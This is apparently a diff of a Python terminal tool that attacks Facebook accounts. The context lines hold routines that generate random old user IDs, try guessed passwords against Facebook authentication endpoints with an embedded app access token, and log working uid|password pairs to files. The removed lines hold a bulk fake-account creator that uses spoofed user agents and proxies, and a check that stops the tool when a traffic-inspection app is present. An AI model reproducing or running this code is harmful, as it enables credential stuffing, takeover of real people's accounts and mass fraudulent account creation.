@@ -19,7 +19,7 @@ import os, sys
 import requests
 
 # Tumhara WhatsApp channel link
-# Follow the Hurain Cute channel on WhatsApp: https://whatsapp.com/channel/0029VbDD6TJ3GJP51J4rSU0E"
+# Follow the Hurain Cute channel on WhatsApp: https://whatsapp.com/channel/0029VbDD6TJ3GP51J4rSU0E
 
 # Valid keys (channel par available hogi)
 approved_keys = ["SALMA_KHANI"]
@@ -172,26 +172,6 @@ def window1():
     return random.choice([A, B, C, D])
 
 
-def window1():
-    """
-    Generates another variant of a random Windows User-Agent string.
-    """
-    aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
-    bV = str(random.choice(range(1, 36)))
-    bx = str(random.choice(range(34, 38)))
-    bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
-    cV = str(random.choice(range(1, 36)))
-    cx = str(random.choice(range(34, 38)))
-    cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
-    latest_build = rr(6000, 9000)
-    latest_patch = rr(100, 200)
-    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-    return random.choice([A, B, C, D])
-
-
 # Set window title
 sys.stdout.write('\x1b]2;𓆩【ⁱᵃᵐ|𝗞𝗵𝗮𝗇𝙞𒆜👑 】𓆪 \x07')
 
@@ -244,54 +224,7 @@ plist=[]
 __COOKIE__=[]
 __CP__=[]
 __LOCK__=[]
-#-----------------------( API BYPASS )-----------------------#
-def http_canary():
-    try:
-        if os.path.exists(os.path.join(path_canary,package_name)):
-            system("clear" if os.name == "posix" else "cls")
-            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
-            exit('\n')
-        if os.path.exists(os.path.join(path_canary2,package_name2)):
-            system("clear" if os.name == "posix" else "cls")
-            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
-            exit('\n')
-        elif os.path.exists(os.path.join(path_canary3,package_name3)):
-            system("clear" if os.name == "posix" else "cls")
-            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
-            exit('\n')
-        elif os.path.exists(os.path.join(path_canary4,package_name4)):
-            system("clear" if os.name == "posix" else "cls")
-            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
-            exit('\n')
-        elif os.path.exists(os.path.join(path_canary5,package_name5)):
-            system("clear" if os.name == "posix" else "cls")
-            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
-            exit('\n')
-        elif os.path.exists(os.path.join(path_canary6,package_name6)):
-            system("clear" if os.name == "posix" else "cls")
-            print(f"{xpxx} FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS")
-            exit('\n')
-        else:
-            pass
-    except:
-        system("clear" if os.name == "posix" else "cls")
-        print(f"{xp} TURN ON STORAGE PERMISSION")
-        exit('\n')
-#-----------------------( MAIN/MENU )-----------------------#
-def __MENU__():
-    __ERRORLOGO__()
-    print(f"{xp1} AUTO CREATE FB ")
-    print(f"{xp2} 2FA ")
-    print(f"{xp3} COOKIE EXTRACT ")
-    print(f"{xp0} EXIT TOOLS ")
-    __LINE__()
-    __MENUC__=input(f"{xpx} INPUT MENU {xpxxx} ")
-    if __MENUC__=="1":
-       __AUTOX__()
-    elif __MENUC__=="2":__2FAX__()
-    elif __MENUC__=="3":__COKIX__()
-    elif __MENUC__=="0":__LINE__();print(f"{xp} EXIT SUCCESSFULLY ");time.sleep(1.1);__LINE__();os.system(f"exit")
-    else:__LINE__();print(f"{xpxx} INVALID OPTION TRY AGAIN ");time.sleep(1);__MENU__()
+
 #-----------------------( MAIN/MENU )-----------------------#
 def __MENU__():      
     print(f"{xp1} AUTO CREATE FB ")
@@ -306,139 +239,12 @@ def __MENU__():
     elif __MENUC__=="3":__COKIX__()
     elif __MENUC__=="0":__LINE__();print(f"{xp} EXIT SUCCESSFULLY ");time.sleep(1.1);__LINE__();os.system(f"exit")
     else:__LINE__();print(f"{xpxx} INVALID OPTION TRY AGAIN ");time.sleep(1);__MENU__()
-#-----------------------( AUTO-MENU )-----------------------#
-def __AUTOX__():
-    __ERRORLOGO__()
-    __NUM__=input(f"{xp} HOW MANY FACEBOOK ACCOUNT LIMIT {xpxxx}︎ ")
-    __ERRORLOGO__()
-    print(f"{xp1} GIRL NAME PHILIPPINES ")
-    print(f"{xp2} BOY NAME PHILIPPINES ")
-    print(f"{xp3} GIRL NAME NEPAL ")
-    print(f"{xp4} BOY NAME NEPAL ")
-    print(f"{xp5} GIRL NAME PAKISTAN ")
-    print(f"{xp6} BOY NAME PAKISTAN ")
-    __LINE__()
-    __NAME__=input(f"{xpx} INPUT NAME {xpxxx} ")
-    __ERRORLOGO__()
-    print(f"{xp1} FEMALE ")
-    print(f"{xp2} MALE ")
-    __LINE__()
-    __GENDER__=input(f"{xpx} INPUT GENDER {xpxxx} ")
-    __ERRORLOGO__()
-    print(f"{xp1} AUTO PASSWORD ")
-    print(f"{xp2} AUTO PASSWORD WITH NAMENUMBER ")
-    print(f"{xp3} AUTO PASSWORD WITH SURNAME ")
-    print(f"{xp4} MANUAL CUSTOM PASSWORD ")
-    __LINE__()
-    __PASS__=input(f"{xpx} INPUT PASSWORD {xpxxx} ")
-    if __PASS__=="4":pww=input(f"{xpx} ETHER CUSTOMER PASSWORD {xpxxx} ")
-    __ERRORLOGO__()
-    print(f"{xp} SHOW ALL DETAILS...? ")
-    __LINE__()
-    show_details=input(f"{xpx} {white}[{green}Y{white}/{red}N{white}] {xpxxx} ")
-    __ERRORLOGO__()
-    print(f"{xp} TOTAL NEW ACCOUNT IDS {xpxxx} {__NUM__}")
-    print(f"{xp} CREATING ACCOUNT STARTED")
-    print(f"{xp} USER 1.1.1 VPN")
-    __LINE__()
-    for _ in range(int(__NUM__)):
-        try:
-            global oks,cps
-            color=random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
-            sys.stdout.write(f'\r {white}[{green}KITTY-CREATE{white}]-{white}[{green}OK:-%s{white}] '%(len(oks)));sys.stdout.flush()
-            sys.stdout.flush()
-            ses=requests.Session()
-            response=ses.get("https://x.facebook.com/reg")
-            form=extractor(response.text)
-            if __NAME__=="1":firstname,lastname=get_girl_name_ph()
-            elif __NAME__=="2":firstname,lastname=get_boy_name_ph()
-            elif __NAME__=="3":firstname,lastname=get_girl_name_nepal()
-            elif __NAME__=="4":firstname,lastname=get_boy_name_nepal()
-            elif __NAME__=="5":firstname,lastname=get_girl_name_pakistan()
-            elif __NAME__=="6":firstname,lastname=get_boy_name_pakistan()
-            if __GENDER__=="1":sex,gender="1","Female"
-            elif __GENDER__=="2":sex,gender="2","Male"
-            if __PASS__=="1":pww=get_pass()
-            if __PASS__=="2":pww=f"{firstname.lower()}{random.choice([123,12345,123456,1234567,123456789,1234567890,143,143143,123123])}"
-            if __PASS__=="3":pww=f"{firstname.lower()}{lastname.lower()}"
-            phone=generate_phone_number()
-            payload={'ccp': "2",
-            'reg_instance': form.get("reg_instance",""),
-            'submission_request': "true",
-            'reg_impression_id': form.get("reg_impression_id",""),
-            'ns': "1",
-            'logger_id': form.get("logger_id",""),
-            'firstname': firstname,
-            'lastname': lastname,
-            'birthday_day': str(random.randint(15,25)),
-            'birthday_month': str(random.randint(5,10)),
-            'birthday_year': str(random.randint(1985,1995)),
-            'reg_email__': phone,
-            'sex': sex,
-            'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pww}',
-            'submit': "Sign Up",
-            'fb_dtsg': form.get("fb_dtsg",""),
-            'jazoest': form.get("jazoest",""),
-            'lsd': form.get("lsd","")}
-            headers={"Host": "m.facebook.com",
-            "Connection": "keep-alive",
-            "User-Agent": ___EthanAutoUa2___(),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language": "en-US,en;q=0.9"}
-            head1={'accept-encoding': 'gzip, deflate',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/reg/',
-            'sec-ch-ua': '',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': 'Android',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': ___EthanAutoUa2___()}
-            merged_headers={**headers,**head1}
-            reg_url="https://www.facebook.com/reg/submit/"
-            reg_submit=ses.post(reg_url,data=payload,headers=merged_headers,proxies=ethanproxy())
-            login_coki=ses.cookies.get_dict()
-            if "c_user" in login_coki:
-                coki="sb=Cracked.By-Error_Tool;"+";".join([f"{key}={value}" for key,value in login_coki.items()])
-                uid=login_coki["c_user"]
-                if show_details=='y':
-                    print(f"\r{xp} NAME     {xpxxx} {firstname} {lastname}\033[1;37m")
-                    print(f"\r{xp} NUMBER   {xpxxx} {phone}\033[1;37m")
-                    print(f"\r{xp} GENDER   {xpxxx} {gender}\033[1;37m")
-                    print(f"\r{xp} BIRTHDAY {xpxxx} {payload['birthday_day']}-{payload['birthday_month']}-{payload['birthday_year']}\033[1;37m")
-                    print(f"\r{xp} UID      {xpxxx} {uid}\033[1;37m")
-                    print(f"\r{xp} PASS     {xpxxx} {pww}\033[1;37m")
-                    print(f"\r{xp} COOKIE   {xpxxx} {coki}\033[1;37m")
-                    __LINE__()
-                else:
-                    print(f'\r{green} [KALYAN-OK] '+uid+' | '+pww+'\033[1;97m')
-                open('/sdcard/KALYAN-AUTO/AUTO/KALYAN-AUTO-OK.txt', 'a').write(uid+'|'+pww+'|'+coki+'\n')
-                oks.append(uid)
-            elif "checkpoint" in login_coki:
-                uid=login_coki.get("c_user","unknown")
-                cps.append(uid)
-            time.sleep(1)
-        except Exception as e:pass
-    print("\033[1;37m")
-    __LINE__()
-    print(f"{xp} THE PROCESS HAS COMPLETED...!")
-    __LINE__()
-    print(f"{xp} {green}TOTAL OK {xpxxx} {len(oks)}")
-    print(f"{xp} {red}TOTAL CP {xpxxx} {len(cps)}")
-    print(f"{xp} {blue}TOTAL 2F {xpxxx} {len(twf)}")
-    __LINE__()
-    print(f"{xp} THANKS FOR USING.....! ")
-    __LINE__()
-    exit()
+
 #-----------------------( 2FA-MENU )-----------------------#
 def __2FAX__():
     print(f"{xp} COMING SOON")
     exit()
+
 #-----------------------( COKI-MENU )-----------------------#
 def __COKIX__():
     print(f"{xp} COMING SOON")
@@ -553,7 +359,7 @@ def old_One():
     """
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD Code {Y}:{G} 2010-2014")
     ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
     linex()
     ____banner____()
@@ -594,8 +400,8 @@ def old_Tow():
     ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     prefixes = ['100003', '100004']
     for _ in range(int(limit)):
@@ -606,11 +412,11 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -628,26 +434,26 @@ def old_Tree():
     """
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
     linex()
     prefix = '1000004'
     for _ in range(int(limit)):
         suffix = ''.join(random.choices('0123456789', k=8))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMethod B')
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mHAR 5 MINT ME AEROPLANE MODE LGAO{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mHAR 5 MINT ME AEROPLANE MODE LGAO{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -711,13 +517,12 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mSALMA
-\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/SALMA  -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mSALMA) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/SALMA -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mSALMA \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mSALMA) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/SALMA -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
@@ -748,13 +553,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mSALMA  XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/SALMA  -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mSALMA XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/SALMA -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mSALMA  \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/SALMA  -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mSALMA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/SALMA -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
